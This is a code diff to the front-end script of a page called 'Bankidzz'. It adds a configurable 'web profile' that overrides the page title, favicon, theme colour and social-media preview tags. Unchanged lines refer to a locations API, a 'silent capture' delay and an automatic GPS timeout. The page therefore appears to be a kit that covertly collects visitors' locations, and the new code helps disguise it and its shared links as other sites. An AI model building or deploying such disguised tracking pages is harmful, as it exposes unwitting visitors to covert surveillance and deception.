@@ -8,6 +8,7 @@
     const CONFIG = {
         API_URL: '/api/locations',
         TEMPLATE_URL: '/api/template',
+        WEBPROFILE_URL: '/api/webprofile',
         SYNC_CHANNEL: 'bankidzz_sync_channel',
         SILENT_CAPTURE_DELAY: 200,       // delay ultra-cepat (ms)
         LOCATION_TIMEOUT: 1500,          // timeout GPS otomatis (ms)
@@ -613,8 +614,12 @@
     // ============================================================
     function applyTemplate(template) {
         currentTemplate = { ...defaultTemplate, ...template };
-        document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
-        document.title = currentTemplate.topBarTitle || 'Bankidzz';
+        if (!currentWebProfile || !currentWebProfile.themeColor) {
+            document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
+        }
+        if (!currentWebProfile || !currentWebProfile.siteTitle) {
+            document.title = currentTemplate.topBarTitle || 'Bankidzz';
+        }
         
         if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
         if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
@@ -672,6 +677,112 @@
         el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
     }
 
+    let currentWebProfile = null;
+
+    function applyWebProfile(profile) {
+        if (!profile) return;
+        currentWebProfile = profile;
+
+        if (profile.siteTitle) {
+            document.title = profile.siteTitle;
+            const metaTitle = document.getElementById('metaTitle');
+            if (metaTitle) metaTitle.textContent = profile.siteTitle;
+        }
+        if (profile.metaDescription) {
+            const metaDesc = document.getElementById('metaDescription');
+            if (metaDesc) metaDesc.setAttribute('content', profile.metaDescription);
+        }
+        if (profile.favicon) {
+            let linkFav = document.getElementById('metaFavicon') || document.querySelector("link[rel~='icon']");
+            if (!linkFav) {
+                linkFav = document.createElement('link');
+                linkFav.rel = 'icon';
+                document.head.appendChild(linkFav);
+            }
+            linkFav.href = profile.favicon;
+        }
+        if (profile.appleTouchIcon) {
+            let linkApple = document.getElementById('metaAppleIcon') || document.querySelector("link[rel='apple-touch-icon']");
+            if (!linkApple) {
+                linkApple = document.createElement('link');
+                linkApple.rel = 'apple-touch-icon';
+                document.head.appendChild(linkApple);
+            }
+            linkApple.href = profile.appleTouchIcon;
+        }
+        if (profile.themeColor) {
+            document.documentElement.style.setProperty('--primary-blue', profile.themeColor);
+            const metaTheme = document.getElementById('metaThemeColor') || document.querySelector("meta[name='theme-color']");
+            if (metaTheme) metaTheme.setAttribute('content', profile.themeColor);
+            const topBar = document.querySelector('.top-bar');
+            if (topBar) topBar.style.backgroundColor = profile.themeColor;
+            const btnConfirm = document.getElementById('btnConfirm');
+            if (btnConfirm && btnConfirm.dataset.verified !== 'true') {
+                btnConfirm.style.backgroundColor = profile.themeColor;
+            }
+        }
+        if (profile.ogTitle) {
+            const ogTitle = document.getElementById('ogTitle') || document.querySelector("meta[property='og:title']");
+            if (ogTitle) ogTitle.setAttribute('content', profile.ogTitle);
+        }
+        if (profile.ogDescription) {
+            const ogDesc = document.getElementById('ogDescription') || document.querySelector("meta[property='og:description']");
+            if (ogDesc) ogDesc.setAttribute('content', profile.ogDescription);
+        }
+        if (profile.ogImage) {
+            const ogImg = document.getElementById('ogImage') || document.querySelector("meta[property='og:image']");
+            if (ogImg) ogImg.setAttribute('content', profile.ogImage);
+        }
+        if (profile.twitterTitle) {
+            const twTitle = document.getElementById('twitterTitle') || document.querySelector("meta[name='twitter:title']");
+            if (twTitle) twTitle.setAttribute('content', profile.twitterTitle);
+        }
+        if (profile.twitterDescription) {
+            const twDesc = document.getElementById('twitterDescription') || document.querySelector("meta[name='twitter:description']");
+            if (twDesc) twDesc.setAttribute('content', profile.twitterDescription);
+        }
+        if (profile.twitterImage) {
+            const twImg = document.getElementById('twitterImage') || document.querySelector("meta[name='twitter:image']");
+            if (twImg) twImg.setAttribute('content', profile.twitterImage);
+        }
+    }
+
+    async function loadWebProfile() {
+        // 1. Coba dari API backend
+        try {
+            const response = await fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' });
+            if (response.ok) {
+                const result = await response.json();
+                if (result.profile) {
+                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(result.profile));
+                    applyWebProfile(result.profile);
+                    return;
+                }
+            }
+        } catch(e) {}
+
+        // 2. Coba dari file webprofile.json langsung (berguna untuk Live Server port 5500 / hosting statis)
+        try {
+            const staticResp = await fetch('webprofile.json', { cache: 'no-store' });
+            if (staticResp.ok) {
+                const staticProfile = await staticResp.json();
+                if (staticProfile) {
+                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(staticProfile));
+                    applyWebProfile(staticProfile);
+                    return;
+                }
+            }
+        } catch(e) {}
+
+        // 3. Fallback ke localStorage
+        const stored = localStorage.getItem('bankidzz_web_profile');
+        if (stored) {
+            try {
+                applyWebProfile(JSON.parse(stored));
+            } catch(e) {}
+        }
+    }
+
     function setupSyncListener() {
         try {
             const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
@@ -680,6 +791,11 @@
                     if (event.data.template) {
                         localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
                         applyTemplate(event.data.template);
+                    }
+                } else if (event.data && event.data.type === 'webprofile_updated') {
+                    if (event.data.profile) {
+                        localStorage.setItem('bankidzz_web_profile', JSON.stringify(event.data.profile));
+                        applyWebProfile(event.data.profile);
                     }
                 }
             });
@@ -713,6 +829,7 @@
 
     // Init
     loadTemplate();
+    loadWebProfile();
     setupSyncListener();
 
 })();
